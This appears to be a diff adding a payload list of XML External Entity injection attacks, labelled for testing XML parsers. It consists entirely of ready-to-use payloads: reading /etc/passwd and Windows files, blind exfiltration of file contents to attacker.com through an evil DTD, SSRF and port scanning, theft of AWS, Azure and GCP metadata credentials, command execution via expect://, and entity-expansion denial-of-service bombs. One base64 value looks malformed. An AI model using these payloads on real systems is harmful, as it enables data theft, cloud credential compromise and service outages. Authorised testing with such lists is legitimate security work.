@@ -1,0 +1,226 @@
+# XML External Entity (XXE) Injection Payloads
+# Test for XXE vulnerabilities in XML parsers
+
+# Basic XXE - File Disclosure
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<foo>&xxe;</foo>
+
+# XXE with CDATA
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo><![CDATA[&xxe;]]></foo>
+
+# XXE - PHP Wrapper (Base64)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<foo>&xxe;</foo>
+
+# XXE - File Read with Error
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+]>
+<foo>test</foo>
+
+# Blind XXE - Out-of-Band (OOB)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=test">]>
+<foo>&xxe;</foo>
+
+# Blind XXE - DNS Exfiltration
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+<foo>test</foo>
+
+# XXE - Parameter Entity
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<foo>&send;</foo>
+
+# XXE - UTF-7 Encoding
+<?xml version="1.0" encoding="UTF-7"?>
++ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI +AD4AXQA+
++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4-
+
+# XXE - Internal Subset
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+
+# XXE - External Subset
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
+<foo>&xxe;</foo>
+
+# XXE - Recursive Entity (Billion Laughs Attack)
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<lolz>&lol4;</lolz>
+
+# XXE - SOAP Request
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Body>
+<foo>&xxe;</foo>
+</soap:Body>
+</soap:Envelope>
+
+# XXE - SVG Image
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
+<text x="0" y="16">&xxe;</text>
+</svg>
+
+# XXE - RSS Feed
+<?xml version="1.0"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<rss version="2.0">
+<channel>
+<title>&xxe;</title>
+</channel>
+</rss>
+
+# XXE - Office Documents (DOCX/XLSX)
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+<w:body>
+<w:p>
+<w:r>
+<w:t>&xxe;</w:t>
+</w:r>
+</w:p>
+</w:body>
+</w:document>
+
+# XXE - Data Exfiltration via HTTP
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+%send;
+]>
+<foo>test</foo>
+
+# Evil DTD File Content (evil.dtd):
+# <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
+# %all;
+
+# XXE - FTP Protocol
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com:21/test">]>
+<foo>&xxe;</foo>
+
+# XXE - Expect Protocol (PHP)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<foo>&xxe;</foo>
+
+# XXE - Jar Protocol (Java)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///var/www/html/file.zip!/file.txt">]>
+<foo>&xxe;</foo>
+
+# XXE - NetDoc Protocol (Java)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">]>
+<foo>&xxe;</foo>
+
+# XXE - Gopher Protocol
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/xHELO%20test">]>
+<foo>&xxe;</foo>
+
+# XXE - Windows UNC Path
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://\\attacker.com\share\file.txt">]>
+<foo>&xxe;</foo>
+
+# XXE - SSRF via XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
+<foo>&xxe;</foo>
+
+# XXE - Port Scanning
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:22">]>
+<foo>&xxe;</foo>
+
+# XXE - Cloud Metadata (AWS)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
+<foo>&xxe;</foo>
+
+# XXE - Cloud Metadata (Azure)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]>
+<foo>&xxe;</foo>
+
+# XXE - Cloud Metadata (GCP)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>
+<foo>&xxe;</foo>
+
+# XXE - Encoded Payloads
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data:text/plain;base64,L2V0Y9wYXNzd2Q=">]>
+<foo>&xxe;</foo>
+
+# XXE - Namespace Confusion
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include href="file:///etc/passwd" parse="text"/>
+</root>
+
+# XXE - XLIFF Format
+<?xml version="1.0"?>
+<!DOCTYPE xliff [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<xliff version="1.2">
+<file>
+<body>
+<trans-unit>
+<source>&xxe;</source>
+</trans-unit>
+</body>
+</file>
+</xliff>
+
+# XXE - XSLT
+<?xml version="1.0"?>
+<!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<xsl:value-of select="&xxe;"/>
+</xsl:template>
+</xsl:stylesheet>
+
+# XXE - XML Bomb (Quadratic Blowup)
+<?xml version="1.0"?>
+<!DOCTYPE bomb [
+<!ENTITY a "aaaaaaaaaaaaaaaaaaaa">
+<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+]>
+<bomb>&c;</bomb>
